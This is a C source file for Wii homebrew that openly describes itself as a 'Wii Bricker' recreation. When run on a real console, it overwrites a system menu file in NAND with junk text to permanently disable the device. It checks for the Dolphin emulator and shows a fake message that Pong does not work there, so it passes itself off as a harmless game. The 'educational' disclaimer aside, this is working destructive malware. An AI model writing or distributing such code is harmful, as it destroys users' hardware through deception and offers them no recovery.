/* Wii Bricker 9000 Recreation by EmmyModd
 * This is ONLY FOR EDUCATIONAL PURPOSES!
 * I AM NOT RESONCIBLE FOR ANY BRICKS CAUSED BY THIS
 * IF YOU END UP BRICKING, I'M SORRY
 * I saw a bricker for the Wii and I wanted to recreate this.
 * What this does, it overwrites the main IOS file with OwOs and UwUs and your Wii is fucked!
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <gccore.h>
#include <wiiuse/wpad.h>
#include <sys/param.h>

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

// int my ass
int main(int argc, char **argv) {
	//init some shit
	VIDEO_Init();	
	WPAD_Init();
	ISFS_Initialize();
	rmode = VIDEO_GetPreferredMode(NULL);
	xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));
	console_init(xfb,20,20,rmode->fbWidth,rmode->xfbHeight,rmode->fbWidth*VI_DISPLAY_PIX_SZ);	
	VIDEO_Configure(rmode);
	VIDEO_ClearFrameBuffer(rmode, xfb, COLOR_BLUE);	
	VIDEO_SetNextFramebuffer(xfb);	
	VIDEO_SetBlack(FALSE);	
	VIDEO_Flush();	
	VIDEO_WaitVSync();
	
	if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();
	
	// Lazy ass Dolphin check that the OG author couldn't write a better one
	// You can just make an sd.raw on your Real Wiis NAND!
	if (NAND_IsFilePresent("/sd.raw")) {
		printf("Pong doesn't work on Dolphin. Sorry!");
	} else {
		// Real part of the code! Not good!
		printf("\x1b[41;37m");
		printf("\x1b[2J");
		printf("\n\tWii Bricker 9000");
		printf("\n=================================================================================");
		printf("\n\tCorrupting /title/00000001/00000002/content/0000009a.app...");
		NAND_WriteFile("/title/00000001/00000002/content/0000009a.app", "OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO UwU OwO");
		printf("\n\n\tDone! Enjoy your brick! UwU");
	}
}
